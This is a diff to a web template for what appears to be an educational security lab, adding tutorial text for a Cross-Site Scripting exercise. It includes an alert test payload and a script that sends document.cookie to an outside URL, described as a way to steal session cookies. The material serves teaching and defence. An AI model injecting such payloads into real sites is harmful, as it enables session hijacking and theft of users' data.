@@ -15,7 +15,7 @@ html
             .dropdown-header(onclick='toggleDropdown(this)') Choose Attack
             .dropdown-content
               #[button(type="submit" onclick="swapGuide(1, 0);") SQL Injection]
-              #[button(type="submit" onclick="swapGuide(2, 0);") Cross-Site Script]
+              #[button(type="submit" onclick="swapGuide(2, 0);") Cross-Site Scripting]
           section#prev-button-atk #[button(type="submit" onclick="swapGuide(-1, -1);") Prev Page]
           section#next-button-atk #[button(type="submit" onclick="swapGuide(-1, 1);") Next Page]
         p#attack-content Choose a potential Attack to get started.
@@ -258,19 +258,19 @@ html
             if (page == 0) {
               document.getElementById("prev-button-atk").style.display = 'none';
               document.getElementById("next-button-atk").style.display = 'block';
-              content.innerHTML = '-->Cross-Site Scripting (XSS) 0<br><br>Viewable information on a website is usually written in HTML, a markup language that renders data on the front end. It can lay out paragraphs, load photos and organise tables, but something it cannot do is run code. Instead, HTML outsources its code to javascript, being written within script tags that allow it to run. This is what allows more complex behaviour, such as … <br><br>As an attacker, however, we can take advantage of the existence of these isolated script environments and make our own to run some code. The injection of code on to a HTML rendering is called Cross-Site Scripting, or XSS for short. This technique is blocked by a range of means, including blocking potentially malicious inputs with sanitation or by encoding our input so it can be rendered as a simple string. You can read about these in the Input Sanitisation and Input Encoding sections respectively in Defences. For this to work, therefore, both must be disabled.';
+              content.innerHTML = '-->Cross-Site Scripting (XSS) 0<br><br>Website frontend pages have their data rendered using HTML. This allows formatting of text, tables and photos, however it cannot run code - instead HTML uses script tags to embed javascript to execute. For example, the /login page can use embedded code to hash the inputted password for more safe sending. <br><br>An attacker can take advantage of this isolated script environments in order to add their own code. Doing so is called Cross-Site Scripting, or XSS for short. With this, one can steal valuable data from users by injecting malicious code for them to run.<br><br>For this exercise, certain data will be changed, for which you need to relocate to /login/out to undo each step before moving on.';
             } else if (page == 1) {
               document.getElementById("prev-button-atk").style.display = 'block';
               document.getElementById("next-button-atk").style.display = 'block';
-              content.innerHTML = '-->Cross-Site Scripting (XSS) 1<br><br>';
+              content.innerHTML = '-->Cross-Site Scripting (XSS) 1<br><br>First we need to know if a website is XSS exploitable. This technique can only work on websites that do not employ some basic defences, such as <u>Input Encoding</u> which you can read more about in its respective Defence section. To verify this, try entering the following text to either page with Encoding on and off. <br><br> &lt;script&gt; alert("helloworld") &lt;/script&gt; <br><br>How this works is that our input is assigned to a variable as normal, which the website attempts to reprint back to us. However, as our text uses the script tags, in trying to print it instead runs the inputted code. In this case, a pop-up is shown. <br><br>Now we know, with Encoding off, we can inject code that the website is forced to run.';
             } else if (page == 2) {
               document.getElementById("prev-button-atk").style.display = 'block';
               document.getElementById("next-button-atk").style.display = 'block';
-              content.innerHTML = '-->Cross-Site Scripting (XSS) 2<br><br>';
+              content.innerHTML = '-->Cross-Site Scripting (XSS) 2<br><br>The alert we just ran is not damaging, but let’s see the kind of harm that an attacker could do by making the command more malicious. With Cross-Site Scripting, an attacker can steal users’ cookies.<br><br>Cookies are stored on a user-by-user basis and can indicate some very important information. One particularly important item is a user’s session-cookie, which gives them their access rights to the website. If these get stolen, the thief can access the user’s session to make changes with their privilege. <br><br>A simple way to reveal stored cookies is by linking users and sending their cookies with them, for example try the following input while noting what it says in the url:<br><br>&lt;script&gt; window.location= "https://google.com?"+document.cookie &lt;/script&gt;';
             }  else if (page == 3) {
               document.getElementById("prev-button-atk").style.display = 'block';
               document.getElementById("next-button-atk").style.display = 'none';
-              content.innerHTML = '-->Cross-Site Scripting (XSS) 3<br><br>';
+              content.innerHTML = '-->Cross-Site Scripting (XSS) 3<br><br>By setting up their own website that listens to the received cookies, an attacker will be given this data. Distribute this to all users at the same time? <br><br>This clearly has some large implications for a wide user base with just a single simple input. It is therefore of great importance that this is protected against, and can be done with ease with some basic input safety such as via sanitisation or encoding.';
             } 
           }
         } else if (help == 2) {
